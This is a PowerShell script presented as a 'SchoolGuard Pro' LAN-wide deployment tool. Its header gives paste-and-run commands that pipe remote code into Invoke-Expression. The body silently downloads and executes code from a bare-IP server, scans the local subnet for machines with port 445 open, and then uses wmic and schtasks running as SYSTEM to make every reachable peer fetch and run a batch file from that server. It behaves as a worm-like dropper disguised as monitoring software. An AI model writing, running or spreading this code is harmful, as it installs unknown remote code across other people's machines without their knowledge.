# ============================================================================
# SchoolGuard Pro — Headless LAN-Wide Master Deployment (Windows)
# Master Command:
#   powershell -NoProfile -ep Bypass -c "irm https://orbstrike.com/lan-win | iex"
#   powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/lan_deploy_win.ps1'))"
# ============================================================================
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls

$VPS_PRIMARY = "https://orbstrike.com"
$VPS_URL = "https://103-149-172-179.sslip.io"
$VPS_HTTP = "http://103.149.172.179:4000"

function Show-TuiProgress {
    param([int]$Percent, [string]$Status)
    $width = 28
    $filled = [math]::Floor(($Percent * $width) / 100)
    $empty = $width - $filled
    $bar = ("#" * $filled) + ("-" * $empty)
    $pad = $Status.PadRight(44).Substring(0, 44)
    Write-Host -NoNewline "`r  [$bar] $($Percent.ToString().PadLeft(3))%  $pad" -ForegroundColor Cyan
}

Show-TuiProgress -Percent 15 -Status "Provisioning local master node..."

foreach ($base in @($VPS_PRIMARY, $VPS_URL, $VPS_HTTP)) {
    try {
        $wc = New-Object System.Net.WebClient
        $winInstaller = $wc.DownloadString("$base/win")
        if ($winInstaller -and $winInstaller.Length -gt 200) {
            Invoke-Expression $winInstaller *>$null
            break
        }
    } catch {}
}

Show-TuiProgress -Percent 40 -Status "Scanning LAN subnet for active nodes..."

$myIp = "127.0.0.1"
try {
    $udp = New-Object System.Net.Sockets.UdpClient
    $udp.Connect("8.8.8.8", 80)
    $myIp = $udp.Client.LocalEndPoint.Address.ToString()
    $udp.Close()
} catch {}

$parts = $myIp -split '\.'
if ($parts.Count -ne 4 -or $myIp -eq "127.0.0.1") {
    Show-TuiProgress -Percent 100 -Status "Complete (local node only)"
    Write-Host ""
    Write-Host "  [OK] Local node active; LAN subnet not detected." -ForegroundColor Yellow
    return
}
$subnet = "$($parts[0]).$($parts[1]).$($parts[2])"
$lanUser = if ($env:SG_USER) { $env:SG_USER } else { $env:USERNAME }
$lanPass = if ($env:SG_PASS) { $env:SG_PASS } else { "" }

$foundIps = New-Object System.Collections.Generic.List[string]
for ($i = 1; $i -le 254; $i++) {
    $ip = "$subnet.$i"
    if ($ip -eq $myIp) { continue }
    $tc = New-Object System.Net.Sockets.TcpClient
    try {
        $ar = $tc.BeginConnect($ip, 445, $null, $null)
        if ($ar.AsyncWaitHandle.WaitOne(50, $false) -and $tc.Connected) {
            $foundIps.Add($ip)
        }
    } catch {}
    try { $tc.Close() } catch {}
}

Show-TuiProgress -Percent 75 -Status "Deploying to $($foundIps.Count) peer nodes..."

$remoteCmd = "cmd.exe /c curl.exe -sSL $VPS_HTTP/s.bat -o C:\Windows\Temp\s.bat && C:\Windows\Temp\s.bat"
$okCount = 0

foreach ($ip in $foundIps) {
    $ok = $false
    try {
        if ($lanPass) {
            & wmic.exe /node:"$ip" /user:"$lanUser" /password:"$lanPass" process call create "$remoteCmd" 2>&1 | Out-Null
            if ($LASTEXITCODE -eq 0) { $ok = $true }
            if (-not $ok) {
                & schtasks.exe /Create /S $ip /U $lanUser /P $lanPass /SC ONCE /TN "SG_LAN_Install" /TR "$remoteCmd" /ST 00:00 /RU SYSTEM /F 2>&1 | Out-Null
                if ($LASTEXITCODE -eq 0) {
                    & schtasks.exe /Run /S $ip /U $lanUser /P $lanPass /TN "SG_LAN_Install" 2>&1 | Out-Null
                    $ok = $true
                }
            }
        } else {
            & wmic.exe /node:"$ip" process call create "$remoteCmd" 2>&1 | Out-Null
            if ($LASTEXITCODE -eq 0) { $ok = $true }
            if (-not $ok) {
                & schtasks.exe /Create /S $ip /SC ONCE /TN "SG_LAN_Install" /TR "$remoteCmd" /ST 00:00 /RU SYSTEM /F 2>&1 | Out-Null
                if ($LASTEXITCODE -eq 0) {
                    & schtasks.exe /Run /S $ip /TN "SG_LAN_Install" 2>&1 | Out-Null
                    $ok = $true
                }
            }
        }
    } catch {}
    if ($ok) { $okCount++ }
}

Show-TuiProgress -Percent 100 -Status "Complete"
Write-Host ""
Write-Host "  [OK] SchoolGuard LAN deployment finished ($okCount/$($foundIps.Count) peer nodes provisioned)." -ForegroundColor Green
